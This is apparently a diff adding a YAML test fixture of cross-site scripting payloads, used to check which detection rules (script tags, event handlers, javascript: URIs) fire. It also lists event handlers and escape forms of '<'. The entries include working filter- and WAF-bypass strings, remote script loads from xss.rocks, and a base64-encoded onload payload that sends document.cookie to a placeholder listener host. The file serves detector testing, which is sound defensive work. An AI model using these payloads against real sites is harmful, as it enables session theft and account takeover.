+  raw: <SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  decoded: <SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  rules:
+  - script_tag
+  source: XSS Using HTML Quote Encapsulation
+  section: Tests
+  lang: html
+- id: xss-using-html-quote-encapsulation-3
+  category: tag
+  raw: <SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  decoded: <SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  rules:
+  - script_tag
+  source: XSS Using HTML Quote Encapsulation
+  section: Tests
+  lang: html
+- id: xss-using-html-quote-encapsulation-4
+  category: tag
+  raw: <SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  decoded: <SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  rules:
+  - script_tag
+  source: XSS Using HTML Quote Encapsulation
+  section: Tests
+  lang: html
+- id: xss-using-html-quote-encapsulation-5
+  category: tag
+  raw: <SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  decoded: <SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  rules:
+  - script_tag
+  source: XSS Using HTML Quote Encapsulation
+  section: Tests
+  lang: html
+- id: xss-using-html-quote-encapsulation-6
+  category: tag
+  raw: <SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  decoded: <SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  rules:
+  - script_tag
+  source: XSS Using HTML Quote Encapsulation
+  section: Tests
+  lang: html
+- id: xss-using-html-quote-encapsulation-7
+  category: tag
+  raw: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  decoded: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  rules:
+  - script_tag
+  source: XSS Using HTML Quote Encapsulation
+  section: Tests
+  lang: html
+- id: ip-versus-hostname
+  category: enc
+  raw: <A HREF="http://66.102.7.147/">XSS</A>
+  decoded: <A HREF="http://66.102.7.147/">XSS</A>
+  rules: []
+  source: IP Versus Hostname
+  section: Tests
+  lang: html
+- id: url-encoding
+  category: enc
+  raw: <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+  decoded: <A HREF="http://www.google.com">XSS</A>
+  rules: []
+  source: URL Encoding
+  section: Tests
+  lang: html
+- id: dword-encoding
+  category: enc
+  raw: <A HREF="http://1113982867/">XSS</A>
+  decoded: <A HREF="http://1113982867/">XSS</A>
+  rules: []
+  source: DWORD Encoding
+  section: Tests
+  lang: html
+- id: hex-encoding
+  category: enc
+  raw: <A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+  decoded: <A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+  rules: []
+  source: Hex Encoding
+  section: Tests
+  lang: html
+- id: octal-encoding
+  category: enc
+  raw: <A HREF="http://0102.0146.0007.00000223/">XSS</A>
+  decoded: <A HREF="http://0102.0146.0007.00000223/">XSS</A>
+  rules: []
+  source: Octal Encoding
+  section: Tests
+  lang: html
+- id: base64-encoding
+  category: event
+  raw: <img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
+  decoded: <img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: Base64 Encoding
+  section: Tests
+  lang: html
+- id: mixed-encoding
+  category: enc
+  raw: "<A HREF=\"h\ntt  p://6\t6.000146.0x7.147/\">XSS</A>"
+  decoded: "<A HREF=\"h\ntt  p://6\t6.000146.0x7.147/\">XSS</A>"
+  rules: []
+  source: Mixed Encoding
+  section: Tests
+  lang: html
+- id: protocol-resolution-bypass
+  category: enc
+  raw: <A HREF="//www.google.com/">XSS</A>
+  decoded: <A HREF="//www.google.com/">XSS</A>
+  rules: []
+  source: Protocol Resolution Bypass
+  section: Tests
+  lang: html
+- id: removing-cnames
+  category: enc
+  raw: <A HREF="http://google.com/">XSS</A>
+  decoded: <A HREF="http://google.com/">XSS</A>
+  rules: &id001 []
+  source: Removing CNAMEs
+  section: Tests
+  lang: html
+- id: removing-cnames-2
+  category: enc
+  raw: <A HREF="http://www.google.com./">XSS</A>
+  decoded: <A HREF="http://www.google.com./">XSS</A>
+  rules: *id001
+  source: Removing CNAMEs
+  section: Tests
+  lang: html
+- id: javascript-link-location
+  category: uri
+  raw: <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+  decoded: <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+  rules:
+  - js_uri
+  source: JavaScript Link Location
+  section: Tests
+  lang: html
+- id: content-replace-as-attack-vector
+  category: enc
+  raw: <A HREF="http://www.google.com/ogle.com/">XSS</A>
+  decoded: <A HREF="http://www.google.com/ogle.com/">XSS</A>
+  rules: []
+  source: Content Replace as Attack Vector
+  section: Tests
+  lang: html
+- id: content-page-source-code
+  category: server
+  raw: a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
+  decoded: a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
+  rules: []
+  source: Content Page Source Code
+  section: Tests
+  lang: html
+- id: share-page-source-code
+  category: server
+  raw: '<script>
+
+    var contentType = <%=Request.getParameter("content_type")%>;
+
+    var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
+
+    ...
+
+    //some user agreement and sending to server logic might be here
+
+    ...
+
+    </script>'
+  decoded: '<script>
+
+    var contentType = <%=Request.getParameter("content_type")%>;
+
+    var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
+
+    ...
+
+    //some user agreement and sending to server logic might be here
+
+    ...
+
+    </script>'
+  rules:
+  - script_tag
+  source: Share Page Source Code
+  section: Tests
+  lang: js
+- id: content-page-output
+  category: server
+  raw: <a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
+  decoded: <a href="/share?content_type=1&title=This is a regular title&content_type=1;alert(1)">Share</a>
+  rules: []
+  source: Content Page Output
+  section: Tests
+  lang: html
+- id: share-page-output
+  category: server
+  raw: '<script>
+
+    var contentType = 1; alert(1);
+
+    var title = "This is a regular title";
+
+    …
+
+    //some user agreement and sending to server logic might be here
+
+    …
+
+    </script>'
+  decoded: '<script>
+
+    var contentType = 1; alert(1);
+
+    var title = "This is a regular title";
+
+    …
+
+    //some user agreement and sending to server logic might be here
+
+    …
+
+    </script>'
+  rules:
+  - script_tag
+  source: Share Page Output
+  section: Tests
+  lang: js
+- id: reflected-xss-in-javascript
+  category: tag
+  raw: <script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
+  decoded: <script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
+  rules:
+  - script_tag
+  source: Reflected XSS in JavaScript
+  section: Methods to Bypass WAF – Cross-Site Scripting
+  lang: js
+- id: reflected-xss-in-javascript-2
+  category: enc
+  raw: /?xss=500); alert(document.cookie);//
+  decoded: /?xss=500); alert(document.cookie);//
+  rules:
+  - TODO_js
+  source: Reflected XSS in JavaScript
+  section: Methods to Bypass WAF – Cross-Site Scripting
+  lang: js
+- id: dom-based-xss
+  category: tag
+  raw: <script> ... eval($\_GET\[xss\]); ... </script>
+  decoded: <script> ... eval($\_GET\[xss\]); ... </script>
+  rules:
+  - script_tag
+  source: DOM-based XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+  lang: js
+- id: dom-based-xss-2
+  category: enc
+  raw: /?xss=document.cookie
+  decoded: /?xss=document.cookie
+  rules:
+  - TODO_js
+  source: DOM-based XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+  lang: js
+- id: xss-via-request-redirection
+  category: server
+  raw: '...
+
+    header(''Location: ''.$_GET[''param'']);
+
+    ...'
+  decoded: '...
+
+    header(''Location: ''.$_GET[''param'']);
+
+    ...'
+  rules: &id002 []
+  source: XSS via request Redirection
+  section: Methods to Bypass WAF – Cross-Site Scripting
+  lang: js
+- id: xss-via-request-redirection-2
+  category: server
+  raw: '...
+
+    header(''Refresh: 0; URL=''.$_GET[''param'']);
+
+    ...'
+  decoded: '...
+
+    header(''Refresh: 0; URL=''.$_GET[''param'']);
+
+    ...'
+  rules: *id002
+  source: XSS via request Redirection
+  section: Methods to Bypass WAF – Cross-Site Scripting
+  lang: js
+- id: xss-via-request-redirection-3
+  category: uri
+  raw: /?param=<javascript:alert(document.cookie>)
+  decoded: /?param=<javascript:alert(document.cookie>)
+  rules:
+  - TODO_tokenizer
+  source: XSS via request Redirection
+  section: Methods to Bypass WAF – Cross-Site Scripting
+  lang: html
+- id: xss-via-request-redirection-4
+  category: uri
+  raw: /?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+  decoded: /?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+  rules:
+  - TODO_js_uri
+  source: XSS via request Redirection
+  section: Methods to Bypass WAF – Cross-Site Scripting
+  lang: html
+- id: waf-bypass-strings-for-xss
+  category: event
+  raw: '<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">'
+  decoded: '<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">'
+  rules:
+  - event_handler
+  - js_uri
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-2
+  category: event
+  raw: '<Video> <source onerror = "javascript: alert (XSS)">'
+  decoded: '<Video> <source onerror = "javascript: alert (XSS)">'
+  rules:
+  - event_handler
+  - js_uri
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-3
+  category: tag
+  raw: <Input value = "XSS" type = text>
+  decoded: <Input value = "XSS" type = text>
+  rules:
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-4
+  category: uri
+  raw: <applet code="javascript:confirm(document.cookie);">
+  decoded: <applet code="javascript:confirm(document.cookie);">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-5
+  category: event
+  raw: <isindex x="javascript:" onmouseover="alert(XSS)">
+  decoded: <isindex x="javascript:" onmouseover="alert(XSS)">
+  rules:
+  - event_handler
+  - js_uri
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-6
+  category: tag
+  raw: '"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
+  decoded: '"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
+  rules:
+  - script_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-7
+  category: event
+  raw: '"><img src="x:x" onerror="alert(XSS)">'
+  decoded: '"><img src="x:x" onerror="alert(XSS)">'
+  rules:
+  - TODO_tokenizer
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-8
+  category: uri
+  raw: '"><iframe src="javascript:alert(XSS)">'
+  decoded: '"><iframe src="javascript:alert(XSS)">'
+  rules:
+  - TODO_tokenizer
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-9
+  category: uri
+  raw: <object data="javascript:alert(XSS)">
+  decoded: <object data="javascript:alert(XSS)">
+  rules:
+  - dangerous_tag
+  - js_uri
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-10
+  category: event
+  raw: <isindex type=image src=1 onerror=alert(XSS)>
+  decoded: <isindex type=image src=1 onerror=alert(XSS)>
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-11
+  category: event
+  raw: <img src=x:alert(alt) onerror=eval(src) alt=0>
+  decoded: <img src=x:alert(alt) onerror=eval(src) alt=0>
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-12
+  category: event
+  raw: <img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+  decoded: <img  src="x:gif" onerror="window['alert'](0)"></img>
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-13
+  category: event
+  raw: <iframe/src="data:text/html,<svg onload=alert(1)>">
+  decoded: <iframe/src="data:text/html,<svg onload=alert(1)>">
+  rules:
+  - dangerous_tag
+  - event_handler
+  - TODO_js_uri
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-14
+  category: enc
+  raw: <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+  decoded: "<meta content=\"\n 1 \n; JAVASCRIPT: alert(1)\" http-equiv=\"refresh\"/>"
+  rules:
+  - dangerous_tag
+  - js_uri
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-15
+  category: enc
+  raw: <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+  decoded: <svg><script xlink:href=data:,window.open('https://www.google.com/')></script
+  rules:
+  - script_tag
+  - dangerous_tag
+  - TODO_js_uri
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-16
+  category: uri
+  raw: <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+  decoded: <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+  rules:
+  - dangerous_tag
+  - TODO_js_uri
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-17
+  category: enc
+  raw: <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+  decoded: <iframe src=javascript:alert(document.location)>
+  rules:
+  - dangerous_tag
+  - TODO_js_uri
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-18
+  category: uri
+  raw: <form><a href="javascript:\u0061lert(1)">X
+  decoded: <form><a href="javascript:alert(1)">X
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-19
+  category: event
+  raw: </script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
+  decoded: "</script><img/*\0/src=\"worksinchrome:prompt(1)\"/\0*/onerror='eval(src)'>"
+  rules:
+  - TODO_tokenizer
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-20
+  category: css
+  raw: <style>//*{x:expression(alert(/xss/))}//<style></style>
+  decoded: <style>//*{x:expression(alert(/xss/))}//<style></style>
+  rules:
+  - TODO_css
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-21
+  category: event
+  raw: <img src="/" =_=" title="onerror='prompt(1)'">
+  decoded: <img src="/" =_=" title="onerror='prompt(1)'">
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-22
+  category: enc
+  raw: <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+  decoded: <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=javascript:alert(1)>ClickMe
+  rules:
+  - TODO_js_uri
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-23
+  category: tag
+  raw: <script x> alert(1) </script 1=2
+  decoded: <script x> alert(1) </script 1=2
+  rules:
+  - script_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-24
+  category: attr
+  raw: <form><button formaction=javascript&colon;alert(1)>CLICKME
+  decoded: <form><button formaction=javascript:alert(1)>CLICKME
+  rules:
+  - TODO_js_uri
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-25
+  category: event
+  raw: <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+  decoded: <input/onmouseover="javaSCRIPT:confirm(1)"
+  rules:
+  - event_handler
+  - js_uri
+  - TODO_dangerous_tag
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-26
+  category: uri
+  raw: <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+  decoded: <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+  rules:
+  - script_tag
+  - dangerous_tag
+  - TODO_js_uri
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: waf-bypass-strings-for-xss-27
+  category: uri
+  raw: '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> '
+  decoded: '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> '
+  rules:
+  - dangerous_tag
+  - js_uri
+  source: WAF ByPass Strings for XSS
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation
+  category: enc
+  raw: (alert)(1)
+  decoded: (alert)(1)
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-2
+  category: enc
+  raw: a=alert,a(1)
+  decoded: a=alert,a(1)
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-3
+  category: enc
+  raw: '[1].find(alert)'
+  decoded: '[1].find(alert)'
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-4
+  category: enc
+  raw: top[“al”+”ert”](1)
+  decoded: top[“al”+”ert”](1)
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-5
+  category: enc
+  raw: top[/al/.source+/ert/.source](1)
+  decoded: top[/al/.source+/ert/.source](1)
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-6
+  category: enc
+  raw: al\u0065rt(1)
+  decoded: alert(1)
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-7
+  category: enc
+  raw: top[‘al\145rt’](1)
+  decoded: top[‘al\145rt’](1)
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-8
+  category: enc
+  raw: top[‘al\x65rt’](1)
+  decoded: top[‘alert’](1)
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-9
+  category: enc
+  raw: top[8680439..toString(30)](1)
+  decoded: top[8680439..toString(30)](1)
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-10
+  category: enc
+  raw: alert?.()
+  decoded: alert?.()
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-11
+  category: enc
+  raw: (alert())
+  decoded: (alert())
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+- id: filter-bypass-alert-obfuscation-12
+  category: enc
+  raw: '&#96;`${alert``}`&#96;'
+  decoded: '``${alert``}``'
+  rules:
+  - TODO_js
+  source: Filter Bypass Alert Obfuscation
+  section: Methods to Bypass WAF – Cross-Site Scripting
+  lang: js
+event_handlers:
+- onAbort
+- onActivate
+- onAfterPrint
+- onAfterUpdate
+- onBeforeActivate
+- onBeforeCopy
+- onBeforeCut
+- onBeforeDeactivate
+- onBeforeEditFocus
+- onBeforePaste
+- onBeforePrint
+- onBeforeUnload
+- onBeforeUpdate
+- onBegin
+- onBlur
+- onBounce
+- onCellChange
+- onChange
+- onClick
+- onContextMenu
+- onControlSelect
+- onCopy
+- onCut
+- onDataAvailable
+- onDataSetChanged
+- onDataSetComplete
+- onDblClick
+- onDeactivate
+- onDrag
+- onDragEnd
+- onDragLeave
+- onDragEnter
+- onDragOver
+- onDragDrop
+- onDragStart
+- onDrop
+- onEnd
+- onError
+- onErrorUpdate
+- onFilterChange
+- onFinish
+- onFocus
+- onFocusIn
+- onFocusOut
+- onHashChange
+- onHelp
+- onInput
+- onKeyDown
+- onKeyPress
+- onKeyUp
+- onLayoutComplete
+- onLoad
+- onLoseCapture
+- onMediaComplete
+- onMediaError
+- onMessage
+- onMouseDown
+- onMouseEnter
+- onMouseLeave
+- onMouseMove
+- onMouseOut
+- onMouseOver
+- onMouseUp
+- onMouseWheel
+- onMove
+- onMoveEnd
+- onMoveStart
+- onOffline
+- onOnline
+- onOutOfSync
+- onPaste
+- onPause
+- onPopState
+- onPropertyChange
+- onReadyStateChange
+- onRedo
+- onRepeat
+- onReset
+- onResize
+- onResizeEnd
+- onResizeStart
+- onResume
+- onReverse
+- onRowsEnter
+- onRowExit
+- onRowDelete
+- onRowInserted
+- onScroll
+- onSeek
+- onSelect
+- onSelectionChange
+- onSelectStart
+- onStart
+- onStop
+- onStorage
+- onSyncRestored
+- onSubmit
+- onTimeError
+- onTrackChange
+- onUndo
+- onUnload
+- onURLFlip
+char_escapes_lt:
+- <
+- '%3C'
+- '&lt'
+- '&lt;'
+- '&LT'
+- '&LT;'
+- '&#60'
+- '&#060'
+- '&#0060'
+- '&#00060'
+- '&#000060'
+- '&#0000060'
+- '&#60;'
+- '&#060;'
+- '&#0060;'
+- '&#00060;'
+- '&#000060;'
+- '&#0000060;'
+- '&#x3c'
+- '&#x03c'
+- '&#x003c'
+- '&#x0003c'
+- '&#x00003c'
+- '&#x000003c'
+- '&#x3c;'
+- '&#x03c;'
+- '&#x003c;'
+- '&#x0003c;'
+- '&#x00003c;'
+- '&#x000003c;'
+- '&#X3c'
+- '&#X03c'
+- '&#X003c'
+- '&#X0003c'
+- '&#X00003c'
+- '&#X000003c'
+- '&#X3c;'
+- '&#X03c;'
+- '&#X003c;'
+- '&#X0003c;'
+- '&#X00003c;'
+- '&#X000003c;'
+- '&#x3C'
+- '&#x03C'
+- '&#x003C'
+- '&#x0003C'
+- '&#x00003C'
+- '&#x000003C'
+- '&#x3C;'
+- '&#x03C;'
+- '&#x003C;'
+- '&#x0003C;'
+- '&#x00003C;'
+- '&#x000003C;'
+- '&#X3C'
+- '&#X03C'
+- '&#X003C'
+- '&#X0003C'
+- '&#X00003C'
+- '&#X000003C'
+- '&#X3C;'
+- '&#X03C;'
+- '&#X003C;'
+- '&#X0003C;'
+- '&#X00003C;'
+- '&#X000003C;'
+- \x3c
+- \x3C
+- \u003c
+- \u003C
